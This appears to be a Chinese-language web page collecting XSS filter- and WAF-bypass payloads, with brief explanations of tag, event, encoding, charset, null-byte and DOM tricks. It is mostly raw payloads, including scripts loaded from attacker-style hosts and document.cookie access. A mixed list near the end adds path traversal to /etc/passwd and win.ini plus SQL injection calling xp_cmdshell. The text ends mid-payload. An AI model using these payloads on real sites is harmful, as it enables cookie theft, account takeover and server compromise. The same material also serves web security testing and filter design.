《xss绕过，payload全集》123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364通杀标签payload：&lt;aaaa id=\"c\" onfocus=\"alert(1)\" tabindex=0&gt; 1、script标签绕过进行一次移除操作：&lt;scr&lt;script&gt;ipt&gt;alert(\"XSS\")&lt;/scr&lt;script&gt;ipt&gt;Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：&lt;script&gt;alert(\"XSS\")&lt;/script&gt;&lt;script src=\"http://attacker.org/malicious.js\"&gt;&lt;/script&gt;1.2 JavaScript 事件我们可以像如下这样在元素中定义 JavaScript 事件：&lt;div onclick=\"alert('xss')\"&gt;这个 JavaScript 代码当有人点击它后就会被执行，同时还有其他事件如页面加载或移动鼠标都可以触发这些事件。绝大部分的时间都被过滤器所移除了，但是依旧还有少量事件没有被过滤，例如，onmouseenter 事件：&lt;divonmouseenter=\"alert('xss')\"&gt;当用户鼠标移动到 div 上时就会触发我们的代码。另一个绕过的办法就是在属性和= 之间插入一个空格：&lt;div onclick =\"alert('xss')\"&gt;1.3 行内样式(Inlinestyle)我们同样可以在行内样式里利用 IE 浏览器支持的动态特性：//IE5之后才支持&lt;div style=\"color: expression(alert('XSS'))\"&gt;//experssion后执行的语句相当于javascript后执行的语句过滤器会检查关键字 style，随后跟随的不能是 &lt;，在随后是 expression：/style=[^&lt;]*((expression\\s*?[&lt;]∗?)|(behavior\\s*:))[^&lt;]*(?=\\&gt;)/Uis所以，让我们需要把 &lt; 放到其他地方：&lt;div style=\"color: '&lt;'; color: expression(alert('XSS'))\"&gt;1.4 CSS importIE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性(dynamic properties)。允许攻击者加载一个外部 CSS 样式表是相当危险的，因为攻击者现在可以在原始页面中执行 JavaScript 代码了。&lt;style&gt;@import url(\"http://attacker.org/malicious.css\");&lt;/style&gt;malicious.css：body &#123; color: expression(alert('XSS'));&#125;为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：&lt;style&gt;@imp\\ort url(\"http://attacker.org/malicious.css\");&lt;/style&gt;IE 浏览器会接受反斜杠，但是我们绕过了过滤器。 1.5 Javascript URL链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：&lt;a href=\"javascript:alert('test')\"&gt;link&lt;/a&gt;上面的过滤会从代码中移除 javascript:，所以我们不能直接这么写代码。但我们可以尝试改变 javascript:的写法，使它依旧可以被浏览器执行但又不匹配正则表达式。首先来尝试下 URL 编码：&lt;a href=\"Java&amp;#115;cript:alert('xss')\"&gt;link&lt;/a&gt;上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。另外，我们还可以使用 VBScript，虽然它在 IE11 中被禁用了，但依旧可以运行在旧版本的 IE 或者启用兼容模式的 IE11 上。我们可以使用类似上面 JavaScript 的方式来插入 VBScript 代码：&lt;a href='vbscript:MsgBox(\"XSS\")'&gt;link&lt;/a&gt;'-confirm`1`-''-confirm(1)-' 1.6 利用字符编码%c1;alert(/xss/);//1.7 绕过长度限制\"onclick=alert(1)//\"&gt;&lt;!----&gt;&lt;script&gt;alert(xss);&lt;script&gt;1.8 使用&lt;base&gt;标签&lt;script&gt;alert(navigator.userAgent)&lt;script&gt;&lt;script&gt;alert(88199)&lt;/script&gt;&lt;script&gt;confirm(88199)&lt;/script&gt;&lt;script&gt;prompt(88199)&lt;/script&gt;&lt;script&gt;\\u0061\\u006C\\u0065\\u0072\\u0074(88199)&lt;/script&gt;&lt;script&gt;+alert(88199)&lt;/script&gt;&lt;script&gt;alert(/88199/)&lt;/script&gt;&lt;script src=data:text/javascript,alert(88199)&gt;&lt;/script&gt;&lt;scriptsrc=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(88199)&gt;&lt;/script&gt;&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;&lt;script&gt;alert(/88199/.source)&lt;/script&gt;&lt;script&gt;setTimeout(alert(88199),0)&lt;/script&gt;&lt;script&gt;document['write'](88199);&lt;/script&gt;&lt;anytag onmouseover=alert(15)&gt;M&lt;anytag onclick=alert(16)&gt;M&lt;a onmouseover=alert(17)&gt;M&lt;a onclick=alert(18)&gt;M&lt;a href=javascript:alert(19)&gt;M&lt;button/onclick=alert(20)&gt;M&lt;form&gt;&lt;buttonformaction=javascript&amp;colon;alert(21)&gt;M&lt;form/action=javascript:alert(22)&gt;&lt;input/type=submit&gt;&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M&lt;img src=x onerror=alert(24)&gt; 29&lt;body/onload=alert(25)&gt;&lt;bodyonscroll=alert(26)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;iframe src=\"http://0x.lv/xss.swf\"&gt;&lt;/iframe&gt;&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;&lt;IFRAME SRC=\"javascript:alert(29);\"&gt;&lt;/IFRAME&gt;&lt;meta http-equiv=\"refresh\" content=\"0;url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E\"&gt;^_^&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+&gt;&lt;/object&gt;&lt;object data=\"javascript:alert(document.domain)\"&gt;&lt;marquee onstart=alert(30)&gt;&lt;/marquee&gt;&lt;isindex type=image src=1 onerror=alert(31)&gt;&lt;isindex action=javascript:alert(32) type=image&gt;&lt;input onfocus=alert(33) autofocus&gt;&lt;input onblur=alert(34) autofocus&gt;&lt;input autofocus&gt; 2.2.1 如果大小写不行的话，&lt;script&gt;被过滤尝试&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;； 2.2.2使用&lt;a&gt;标签测试&lt;a href=“http://www.google.com\"&gt;Clickme&lt;/a&gt;&lt;a被过滤？href被过滤？其他内容被过滤？如果没有过滤尝试使用&lt;a href=”javascript:alert(1)”&gt;Clickme&lt;/a&gt;尝试使用错误的事件查看过滤&lt;a href=\"rhainfosec.com\"onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;HTML5拥有150个事件处理函数，可以多尝试其他函数&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit2.3 测试其他标签src属性&lt;img src=x onerror=prompt(1);&gt;&lt;img/src=aaa.jpg onerror=prompt(1);&lt;video src=x onerror=prompt(1);&gt;&lt;audio src=x onerror=prompt(1);&gt;iframe&lt;iframesrc=\"javascript:alert(2)\"&gt;&lt;iframe/src=\"data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\"&gt;Embed&lt;embed/src=//goo.gl/nlX0P&gt;Action&lt;form action=\"Javascript:alert(1)\"&gt;&lt;input type=submit&gt;&lt;isindex action=\"javascript:alert(1)\" type=image&gt;&lt;isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image&gt;&lt;isindex action=data:text/html, type=image&gt;mario验证&lt;span class=\"pln\"&gt; &lt;/span&gt;&lt;spanclass=\"tag\"&gt;&amp;lt;formaction&lt;/span&gt;&lt;spanclass=\"pun\"&gt;=&lt;/span&gt;&lt;spanclass=\"atv\"&gt;&amp;amp;#039;data:text&amp;amp;sol;html,&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt/script&amp;amp;gt&amp;amp;#039;&lt;/span&gt;&lt;spanclass=\"tag\"&gt;&amp;gt;&amp;lt;button&amp;gt;&lt;/span&gt;&lt;spanclass=\"pln\"&gt;CLICK&lt;/span&gt;“formaction”属性&lt;isindexformaction=\"javascript:alert(1)\" type=image&gt;&lt;input type=\"image\" formaction=JaVaScript:alert(0)&gt; &lt;form&gt;&lt;buttonformaction=javascript&amp;colon;alert(1)&gt;CLICKME“background”属性&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; // Works on Opera10.5 and IE6“posters” 属性&lt;video poster=javascript:alert(1)//&gt;&lt;/video&gt; // Works Upto Opera10.5“data”属性&lt;object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\"&gt;&lt;object/data=//goo.gl/nlX0P?“code”属性&lt;applet code=\"javascript:confirm(document.cookie);\"&gt; // FirefoxOnly&lt;embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always&gt;事件处理&lt;svg/onload=prompt(1);&gt;&lt;marquee/onstart=confirm(2)&gt;/&lt;body onload=prompt(1);&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;textarea autofocus onfocus=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video&gt;&lt;source onerror=\"javascript:alert(1)\"&gt;短payload&lt;q/oncut=open()&gt;&lt;q/oncut=alert(1)&gt; // Useful in-case of payloadrestrictions.嵌套欺骗&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;&lt;body language=vbsonload=alert-1 // Works with IE8&lt;commandonmouseover=\"\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x63\\x6F\\x6E\\x66\\x6 9\\x72\\x6D\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B\"&gt;Save&lt;/command&gt; // Works with IE8圆括号被过滤&lt;a onmouseover=\"javascript:window.onerror=alert;throw 1\"&gt;&lt;img src=x onerror=\"javascript:window.onerror=alert;throw 1\"&gt;&lt;body/onload=javascript:window.onerror=eval;throw&amp;#039;=alert\\x281\\x29&amp;#039;;Expression 属性&lt;img style=\"xss:expression(alert(0))\"&gt; // Works upto IE7.&lt;div style=\"color:rgb(&amp;#039;&amp;#039;x:expression(alert(1))\"&gt;&lt;/div&gt; // Works upto IE7.&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // Works upto IE7“location”属性&lt;a onmouseover=location=’javascript:alert(1)&gt;click&lt;body onfocus=\"location=&amp;#039;javascrpt:alert(1) &gt;123其他Payload&lt;meta http-equiv=\"refresh\" content=\"0;url=//goo.gl/nlX0P\"&gt;&lt;meta http-equiv=\"refresh\" content=\"0;javascript&amp;colon;alert(1)\"/&gt;&lt;svg xmlns=\"http://www.w3.org/2000/svg\"&gt;&lt;g onload=\"javascript:\\u0061lert(1);\"&gt;&lt;/g&gt;&lt;/svg&gt; // By @secalert&lt;svg xmlns:xlink=\" r=100 /&gt;&lt;animateattributeName=\"xlink:href\" values=\";javascript:alert(1)\" begin=\"0s\" dur=\"0.1s\" fill=\"freeze\"/&gt; // By Mario&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href=\"]]&gt;&lt;img/src=xx:xonerror=alert(2)//\"&lt;/svg&gt; // By @secalert&lt;meta content=\"&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon;alert(1)\" http-equiv=\"refresh\"/&gt;&lt;math&gt;&lt;a xlink:href=\"//jsfiddle.NET/t846h/\"&gt;click // ByAshar Javed（）；：被过滤&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; // Works With All Browsers( is html encoded to &amp;#40 ) is html encoded to &amp;#41Opera的变量&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41 // Workswith Opera Only实体解码&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;a href=\"j&amp;#x26;#x26#x41;vascript:alert%252831337%2529\"&gt;Hello&lt;/a&gt;编码JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）href=action=formaction=location=on*=name=background=poster=src=code=data= //只支持base642.4 基于上下文的过滤WAF最大的问题是不能理解内容，使用黑名单可以阻挡独立的js脚本，但仍不能对xss提供足够的保护，如果一个反射型的XSS是下面这种形式2.4.1 输入反射属性&lt;inputvalue=\"XSStest\" type=text&gt;我们可以使用 “&gt;&lt;imgsrc=x onerror=prompt(0);&gt;触发，但是如果&lt;&gt;被过滤，我们仍然可以使用“ autofocusonfocus=alert(1)//触发，基本是使用“ 关闭value属性，再加入我们的执行脚本\" onmouseover=\"prompt(0) x=\"\" onfocusin=alert(1) autofocus x=\"\" onfocusout=alert(1) autofocus x=\"\" onblur=alert(1) autofocus a=\"输入反射在&lt;script&gt;标签内类似这种情况：&lt;script&gt;Varx=”Input”;&lt;/script&gt;通常，我们使用“&gt;&lt;/script&gt;,闭合前面的&lt;/script&gt;标签，然而在这种情况，我们也可以直接输入执行脚本alert(), prompt()confirm() ，例如：“;alert(1)// 2.4.3 超文本内容代码中的情况如下&lt;ahref=”Userinput”&gt;Click&lt;/a&gt;可以使用javascript:alert(1)//直接执行&lt;ahref=”javascript:alert(1)//”&gt;Click&lt;/a&gt; 2.4.4 变形主要包含大小写和JavaScript变形javascript&amp;#058;alert(1)javaSCRIPT&amp;colon;alert(1)JaVaScRipT:alert(1)javas&amp;Tab;cript:\\u0061lert(1);javascript:\\u0061lert&amp;#x28;1&amp;#x29avascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar; // AsharJavedIE10以下和URI中可以使用VBScriptvbscript:alert(1);vbscript&amp;#058;alert(1);vbscr&amp;Tab;ipt:alert(1)\"Data URldata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== 2.4.5JSON内容反射输入encodeURIComponent(&amp;#039;userinput&amp;#039;)可以使用-alert(1)--prompt(1)--confirm(1)-结果encodeURIComponent(&amp;#039;&amp;#039;-alert(1)-&amp;#039;&amp;#039;)encodeURIComponent(&amp;#039;&amp;#039;-prompt(1)-&amp;#039;&amp;#039;)2.4.6 输入反射在svg标签内源码如下：&lt;svg&gt;&lt;script&gt;varmyvar=”YourInput”;&lt;/script&gt;&lt;/svg&gt;可以输入www.site.com/test.PHP?var=text”;alert(1)//如果系统编码了”字符&lt;svg&gt;&lt;script&gt;varmyvar=\"text&amp;quot;;alert(1)//\";&lt;/script&gt;&lt;/svg&gt;原因是引入了附加的（XML）到HTML内容里，可以使用2次编码处理浏览器BUG 2.4.7 字符集BUG字符集BUG在IE中很普遍，最早的bug是UTF-7。如果能控制字符集编码，我们可以绕过99% 的WAF过滤。示例http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS可以控制编码，提交http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=”&gt;&lt;imgsrc=x onerror=prompt(0);&gt;可以修改为UTF-32编码形式???script?alert(1)?/script?http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80 2.4.8 空字节最长用来绕过mod_security防火墙，形式如下：&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;scri\\x00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;空字节只适用于PHP 5.3.8以上的版本 2.4.9 语法BUGRFC声明中节点名称不能是空格，以下的形式在javascript中不能运行&lt;script&gt;alert(1);&lt;/script&gt;&lt;%0ascript&gt;alert(1);&lt;/script&gt;&lt;%0bscript&gt;alert(1);&lt;/script&gt;&lt;%, &lt;//, &lt;!,&lt;?可以被解析成&lt;，所以可以使用以下的payload&lt;// style=x:expression\\28write(1)\\29&gt; // Works upto IE7 参考http://html5sec.org/#71&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; // Worksupto IE9 参考http://html5sec.org/#115&lt;?xml-stylesheet type=\"text/css\"?&gt;&lt;root style=\"x:expression(write(1))\"/&gt; // Works in IE7 参考http://html5sec.org/#77&lt;%div%20style=xss:expression(prompt(1))&gt; // Works Upto IE7 2.4.10Unicode分隔符[on\\w+\\s*]这个规则过滤了所有on事件，为了验证每个浏览器中有效的分隔符，可以使用fuzzing方法测试0×00到0xff，结果如下：IExplorer= [0x09,0x0B,0x0C,0x20,0x3B]Chrome = [0x09,0x20,0x28,0x2C,0x3B]Safari = [0x2C,0x3B]FireFox= [0x09,0x20,0x28,0x2C,0x3B]Opera = [0x09,0x20,0x2C,0x3B]Android = [0x09,0x20,0x28,0x2C,0x3B]x0b在Mod_security中已经被过滤，绕过的方法：&lt;a/onmouseover[\\x0b]=location=&amp;#039;\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x30\\x29\\x3B&amp;#039;&gt;rhainfosec2.4.11缺少X-frame选项通常会认为X-frame是用来防护点击劫持的配置，其实也可以防护使用iframe引用的xss漏洞DocmodesIE引入了doc-mode很长时间，提供给老版本浏览器的后端兼容性，有风险，攻击情景是黑客可以引用你站点的框架，他可以引入doc-mode执行css表达式expression(open(alert(1)))以下POC可以插入到IE7中&lt;html&gt; &lt;body&gt; &lt;meta http-equiv=\"X-UA-Compatible\"content=\"IE=EmulateIE7\" /&gt; &lt;iframesrc=\"https://targetwebsite.com\"&gt; &lt;/body&gt; &lt;/html&gt; 2.4.12Window.name欺骗情景：我们用iframe加载一个页面，我们可以控制窗口的名称，这里也可以执行javascript代码POC&lt;iframesrc=&amp;#039;http://www.target.com?foo=\"xss autofocus/AAAAA onfocus=location=window.name//&amp;#039;name=\"javascript:alert(\"XSS\")\"&gt;&lt;/iframe&gt;DOM型XSS服务器不支持过滤DOM型的XSS，因为DOM型XSS总是在客户端执行，看一个例子：&lt;script&gt; vari=location.hash; document.write(i); &lt;/script&gt;在一些情况下，反射型XSS可以转换成DOM型XSS：http://www.target.com/xss.php?foo=&lt;svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()上面的POC只在[.+都被允许的情况下适用，可以使用location.hash注入任何不允许的编码Location.hash[1] = : // Defined at the first position after the hash.Location.hash[2]= ( // Defined at the second position after the hasLocation.hash[3] = ) // Defined at third position after the hash.如果有客户端过滤可能不适用 2.4.13ModSecurity绕过&lt;scri%00pt&gt;confirm(0);&lt;/scri%00pt&gt;&lt;a/onmouseover[\\x0b]=location=&amp;#039;\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x30\\x29\\x3B&amp;#039;&gt;rhainfosec参考http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html 2.4.14WEB KNIGHT绕过&lt;isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image&gt;&lt;marquee/onstart=confirm(2)&gt;F5 BIG IP ASM and Palo ALTO绕过&lt;table background=\"javascript:alert(1)\"&gt;&lt;/table&gt; //IE6或者低版本Opera “/&gt;&lt;marquee onfinish=confirm(123)&gt;a&lt;/marquee&gt;Dot Defender绕过&lt;svg/onload=prompt(1);&gt; &lt;isindex action=\"javas&amp;tab;cript:alert(1)\" type=image&gt;&lt;marquee/onstart=confirm(2)&gt; XSS Payload杂烩123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(vulnerable)&lt;/script&gt;%3Cscript%3Ealert('XSS')%3C/script%3E&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;img src=\"javascript:alert('XSS')\"&gt;%0a%0a&lt;script&gt;alert(\\\"Vulnerable\\\")&lt;/script&gt;.jsp%22%3cscript%3ealert(%22xss%22)%3c/script%3e%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html%3f.jsp%3f.jsp&lt;script&gt;alert('Vulnerable');&lt;/script&gt;&lt;script&gt;alert('Vulnerable')&lt;/script&gt;?sql_debug=1a%5c.aspxa.jsp/&lt;script&gt;alert('Vulnerable')&lt;/script&gt;a/a?&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"&gt;&lt;script&gt;alert('Vulnerable')&lt;/script&gt;';exec%20master..xp_cmdshell%20'dir%20 c:%20&gt;%20c:\\inetpub\\wwwroot\\?.txt'--&amp;&amp;%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini'';!--\"&lt;XSS&gt;=&amp;&#123;()&#125;&lt;IMG src=\"javascript:alert('XSS');\"&gt;&lt;IMG src=javascript:alert('XSS')&gt;&lt;IMG src=JaVaScRiPt:alert('XSS')&gt;&lt;IMG src=JaVaScRiPt:alert(\"XSS\")&gt;&lt;IMG src=javascript:alert('XSS')&gt;&lt;IMG src=javascript:alert('XSS')&gt;&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;IMG src=\"jav ascript:alert('XSS');\"&gt;&lt;IMG src=\"jav ascript:alert('XSS');\"&gt;&lt;IMG src=\"jav ascript:alert('XSS');\"&gt;\"&lt;IMG src=java\\0script:alert(\\\"XSS\\\")&gt;\";' &gt; out&lt;IMG src=\" javascript:alert('XSS');\"&gt;&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;&lt;BODY BACKGROUND=\"javascript:alert('XSS')\"&gt;&lt;BODY ONLOAD=alert('XSS')&gt;&lt;IMG DYNSRC=\"javascript:alert('XSS')\"&gt;&lt;IMG LOWSRC=\"javascript:alert('XSS')\"&gt;&lt;BGSOUND src=\"javascript:alert('XSS');\"&gt;&lt;br size=\"&amp;&#123;alert('XSS')&#125;\"&gt;&lt;LAYER src=\"http://xss.ha.ckers.org/a.js\"&gt;&lt;/layer&gt;&lt;LINK REL=\"stylesheet\" href=\"javascript:alert('XSS');\"&gt;&lt;IMG src='vbscript:msgbox(\"XSS\")'&gt;&lt;IMG src=\"mocha:[code]\"&gt;&lt;IMG src=\"livescript:[code]\"&gt;&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\"&gt;&lt;IFRAME src=javascript:alert('XSS')&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert('XSS')&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND=\"javascript:alert('XSS')\"&gt;&lt;DIV STYLE=\"background-image: url(javascript:alert('XSS'))\"&gt;&lt;DIV STYLE=\"behaviour: url('http://www.how-to-hack.org/exploit.html');\"&gt;&lt;DIV STYLE=\"width: expression(alert('XSS'));\"&gt;&lt;STYLE&gt;@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';&lt;/STYLE&gt;&lt;IMG STYLE='xss:expre\\ssion(alert(\"XSS\"))'&gt;&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;&lt;STYLE TYPE=\"text/css\"&gt;.XSS&#123;background-image:url(\"javascript:alert('XSS')\");&#125;&lt;/STYLE&gt;&lt;A class=\"XSS\"&gt;&lt;/A&gt;&lt;STYLE type=\"text/css\"&gt;BODY&#123;background:url(\"javascript:alert('XSS')\")&#125;&lt;/STYLE&gt;&lt;BASE href=\"javascript:alert('XSS');//\"&gt;getURL(\"javascript:alert('XSS')\")a=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert('XSS');\";eval(a+b+c+d);&lt;XML src=\"javascript:alert('XSS');\"&gt;\"&gt; &lt;BODY ONLOAD=\"a();\"&gt;&lt;SCRIPT&gt;function a()&#123;alert('XSS');&#125;&lt;/SCRIPT&gt;&lt;\"&lt;SCRIPT src=\"http://xss.ha.ckers.org/xss.jpg\"&gt;&lt;/SCRIPT&gt;&lt;IMG src=\"javascript:alert('XSS')\"&lt;!--#exec cmd=\"/bin/echo '&lt;SCRIPT SRC'\"--&gt;&lt;!--#exec cmd=\"/bin/echo '=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;'\"--&gt;&lt;IMG src=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\"&gt;&lt;SCRIPT a=\"&gt;\" src=\"http://xss.ha.ckers.org/a.js\"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT =\"&gt;\" src=\"http://xss.ha.ckers.org/a.js\"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=\"&gt;\" '' src=\"http://xss.ha.ckers.org/a.js\"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT \"a='&gt;'\" src=\"http://xss.ha.ckers.org/a.js\"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT src=\"http://xss.ha.ckers.org/a.js\"&gt;&lt;/SCRIPT&gt;&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt; 按标签分类的XSS Payload12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394\";alert(1);//xx¼script¾alert(¢XSS¢)¼/script¾ //US-ASCII编码，如Tomcat&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt; //IE7以下&lt;![endif]--&gt;&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;a href=\"javascript:alert(1)\"&gt;aaaa&lt;/a&gt;&lt;a href=\"JavaSCript:alealertrt%25281%2529\"&gt;aaaa&lt;/a&gt;&lt;a onclick=alert(1)&gt;XSS&lt;/a&gt;&lt;a onmouseover=alert(1)&gt;XSS&lt;/a&gt;&lt;body onload=alert(1)&gt; //无需js标签，可直接执行&lt;body background=\"javascript:alert('XSS')\"&gt; //IE7以下&lt;DIV style=\"background-image: url(javascript:alert('XSS'))\"&gt; //IE7以下&lt;DIV style=\"width: expression(alert('XSS'));\"&gt;&lt;embed src=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" allowscriptaccess=\"always\"&gt;&lt;/embed&gt; //Firefox/Chrome&lt;iframe src=\"javascript:alert(1)\"&gt;&lt;/iframe&gt;&lt;iframe src=\"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;&lt;/iframe&gt; //Firefox/Chrome/Safari&lt;iframe src=# onmouseover=\"alert(document.cookie)\"&gt;&lt;/iframe&gt;'\"&gt;&lt;img onmouseover=alert(1)&gt; //IE&lt;img onmouseover=alert(1) src&gt; //IE&lt;img src=x onmouseover=alert(1)&gt;&lt;img src=x 